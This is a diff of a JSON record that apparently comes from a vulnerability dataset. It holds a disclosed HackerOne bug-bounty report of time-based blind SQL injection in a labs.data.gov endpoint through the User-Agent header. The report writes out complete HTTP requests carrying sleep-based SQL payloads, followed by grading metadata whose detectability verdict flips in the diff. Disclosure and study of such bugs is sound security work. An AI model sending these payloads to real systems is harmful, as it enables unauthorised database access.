@@ -1,42 +1,46 @@
 {
-    "reported_to": "GSA Bounty",
-    "reported_by": "harisec ",
-    "title": "SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent ",
-    "content": "\nI've identified an SQL injection vulnerability in the website labs.data.gov that affects the endpoint /dashboard/datagov/csv_to_json and can be exploited via the User-Agent HTTP header.\nI didn't extracted any data from the database, I've confirmed the vulnerability using sleep SQL queries with various arithmetic operations. The sleep command combined with the arithmetic operations will cause the server to sleep for various amounts of time depending on the result of the arithmetic operation.\nFor example, setting the value Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR' to the User-Agent header will cause the server to sleep for 25 (5*5) seconds.\nTo reproduce, send the following HTTPS request:\nCode 340 Bytes\n1GET /dashboard/datagov/csv_to_json HTTP/1.1\n2Referer: 1\n3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'\n4X-Forwarded-For: 1\n5X-Requested-With: XMLHttpRequest\n6Host: labs.data.gov\n7Connection: Keep-alive\n8Accept-Encoding: gzip,deflate\n9Accept: */*\n10\nThe server will respond after 25 (5*5) seconds - same as the value of the User-Agent: header.\nNow, let's cause the server to respond immediately. We will send the value sleep(550) that is equivalent with 0.\nCode 342 Bytes\n1GET /dashboard/datagov/csv_to_json HTTP/1.1\n2Referer: 1\n3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'\n4X-Forwarded-For: 1\n5X-Requested-With: XMLHttpRequest\n6Host: labs.data.gov\n7Connection: Keep-alive\n8Accept-Encoding: gzip,deflate\n9Accept: */*\n10\nThe server responded immediately as 550 = 0.\nLet's confirm it with another request:\nCode 344 Bytes\n1GET /dashboard/datagov/csv_to_json HTTP/1.1\n2Referer: 1\n3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'\n4X-Forwarded-For: 1\n5X-Requested-With: XMLHttpRequest\n6Host: labs.data.gov\n7Connection: Keep-alive\n8Accept-Encoding: gzip,deflate\n9Accept: */*\n10\n11\nThis time the payload contains 6*6-30 that is equal with 6. The server responded after 6 seconds.\nThese are just a few of the SQL queries with various arithmetic operations that I've tried to confirm this issue.\nImpact\nAn attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.\n\n",
-    "severity": [
-        9.1,
-        null
+  "reported_to": "GSA Bounty",
+  "reported_by": "harisec ",
+  "title": "SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent ",
+  "content": "\nI've identified an SQL injection vulnerability in the website labs.data.gov that affects the endpoint /dashboard/datagov/csv_to_json and can be exploited via the User-Agent HTTP header.\nI didn't extracted any data from the database, I've confirmed the vulnerability using sleep SQL queries with various arithmetic operations. The sleep command combined with the arithmetic operations will cause the server to sleep for various amounts of time depending on the result of the arithmetic operation.\nFor example, setting the value Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR' to the User-Agent header will cause the server to sleep for 25 (5*5) seconds.\nTo reproduce, send the following HTTPS request:\nCode 340 Bytes\n1GET /dashboard/datagov/csv_to_json HTTP/1.1\n2Referer: 1\n3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'\n4X-Forwarded-For: 1\n5X-Requested-With: XMLHttpRequest\n6Host: labs.data.gov\n7Connection: Keep-alive\n8Accept-Encoding: gzip,deflate\n9Accept: */*\n10\nThe server will respond after 25 (5*5) seconds - same as the value of the User-Agent: header.\nNow, let's cause the server to respond immediately. We will send the value sleep(550) that is equivalent with 0.\nCode 342 Bytes\n1GET /dashboard/datagov/csv_to_json HTTP/1.1\n2Referer: 1\n3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'\n4X-Forwarded-For: 1\n5X-Requested-With: XMLHttpRequest\n6Host: labs.data.gov\n7Connection: Keep-alive\n8Accept-Encoding: gzip,deflate\n9Accept: */*\n10\nThe server responded immediately as 550 = 0.\nLet's confirm it with another request:\nCode 344 Bytes\n1GET /dashboard/datagov/csv_to_json HTTP/1.1\n2Referer: 1\n3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'\n4X-Forwarded-For: 1\n5X-Requested-With: XMLHttpRequest\n6Host: labs.data.gov\n7Connection: Keep-alive\n8Accept-Encoding: gzip,deflate\n9Accept: */*\n10\n11\nThis time the payload contains 6*6-30 that is equal with 6. The server responded after 6 seconds.\nThese are just a few of the SQL queries with various arithmetic operations that I've tried to confirm this issue.\nImpact\nAn attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.\n\n",
+  "severity": [
+    9.1,
+    null
+  ],
+  "bounty": 2000,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1553284920,
+  "report_url": "https://hackerone.com/reports/297478",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a GET request to https://labs.data.gov/dashboard/datagov/csv_to_json with a malicious User-Agent header containing SQL injection payload (e.g., 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'')"
     ],
-    "bounty": 2000,
-    "weaknesses": [
-        "SQL Injection"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1553284920,
-    "report_url": "https://hackerone.com/reports/297478",
-    "is_multi_component": false,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Send a GET request to https://labs.data.gov/dashboard/datagov/csv_to_json with a malicious User-Agent header containing SQL injection payload (e.g., 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'')"
-        ],
-        [
-            2,
-            "Observe delayed response (25 seconds in this case) confirming SQL injection vulnerability"
-        ]
-    ],
-    "vuln_description": "SQL injection vulnerability in labs.data.gov's /dashboard/datagov/csv_to_json endpoint via User-Agent header manipulation, allowing time-based blind SQL injection attacks against the MySQL database.",
-    "reason": "The vulnerability requires understanding of SQL injection techniques and time-based blind SQLi specifically, but the attack vector (User-Agent header) is straightforward and the payload follows common SQLi patterns. No complex application state manipulation or novel logic is required.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The SQL injection vulnerability is not related to authentication or authorization (AuthN/AuthZ) bypass or IDOR. It involves direct manipulation of SQL queries via the User-Agent header, which is a different class of vulnerability. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, not on detecting SQL injection.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Observe delayed response (25 seconds in this case) confirming SQL injection vulnerability"
+    ]
+  ],
+  "vuln_description": "SQL injection vulnerability in labs.data.gov's /dashboard/datagov/csv_to_json endpoint via User-Agent header manipulation, allowing time-based blind SQL injection attacks against the MySQL database.",
+  "reason": "The vulnerability requires understanding of SQL injection techniques and time-based blind SQLi specifically, but the attack vector (User-Agent header) is straightforward and the payload follows common SQLi patterns. No complex application state manipulation or novel logic is required.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability is detected through manipulation of the User-Agent header, which is part of the HTTP request. The methodology involves analyzing HTTP requests and responses, and since the vulnerability is triggered by modifying the User-Agent header in the request, it falls under the scope of the detection method.",
+    "is_detectable": true
+  },
+  "injection_metadata": {
+    "reasoning": "The SQL injection vulnerability described uses time-based payloads (sleep()) injected via the User-Agent header. The methodology identifies injectable parameters from logged requests (including headers like User-Agent). Time-based payloads qualify as 'simple' since they rely on standard SQLi patterns (sleep arithmetic) and detection occurs via the same channel (response delay). No custom filter bypass or cross-channel navigation is required.",
+    "is_simple_injection": true
+  }
 }
